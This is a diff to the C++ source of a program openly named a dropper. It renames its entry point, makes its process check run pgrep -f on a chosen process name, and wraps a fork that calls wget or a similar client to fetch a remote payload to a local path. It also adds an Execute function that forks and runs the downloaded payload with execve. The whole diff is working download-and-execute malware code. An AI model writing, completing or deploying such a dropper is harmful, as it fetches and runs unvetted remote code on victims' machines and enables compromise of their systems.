@@ -1,11 +1,11 @@
 #include "dropper.h"
 #define die(e) do { fprintf(stderr, "%s\n", e); exit(EXIT_FAILURE); } while (0);
 
-int Pull()
+int Start()
 {
 	fprintf(stdout, "[Dropper called]");
 
-	if(ProcessRunning())
+	if(ProcessRunning(_ProcName))
 	{
 		fputs("[Process already running]\n", stdout);
 		return 0;
@@ -37,7 +37,7 @@ bool FileExists(std::string name)
 	return (stat (name.c_str(), &buffer) == 0);
 }
 
-bool ProcessRunning()
+bool ProcessRunning(std::string processName)
 {
 	int result;
 	int link[2];
@@ -56,7 +56,7 @@ bool ProcessRunning()
 		close(link[0]);
 		close(link[1]);
 
-		char* argv[] = { (char*)"pgrep", (char*)_ProcName.c_str(), (char*)0};
+		char* argv[] = { (char*)"pgrep", (char*) "-f",(char*)processName.c_str(), (char*)0};
 		execve("/usr/bin/pgrep", argv, NULL);
 		die("execve");
 	}
@@ -110,6 +110,7 @@ void Download()
 				int pid = fork();
 
 				if(pid == 0)
+				{
 					execl(webclients[i], "wget", 
 										 (i == 0) ? "-q" : "-sS",
 										 (i == 0) ? "-o" : "",
@@ -118,6 +119,7 @@ void Download()
 										 _PayloadLocal.c_str(), 
 										 _PayloadRemote.c_str(),
 										 NULL);
+				}
 
 				break;
 		}
@@ -126,5 +128,12 @@ void Download()
 
 void Execute(std::string binary)
 {
+	char* argv[] = { (char*)"shell", (char*)0 };
+
+	if(fork() == 0)
+	{
+		execve(_PayloadLocal.c_str(), argv, NULL);
+	}
+
 	fputs("[End of control flow]\n", stdout);
 }
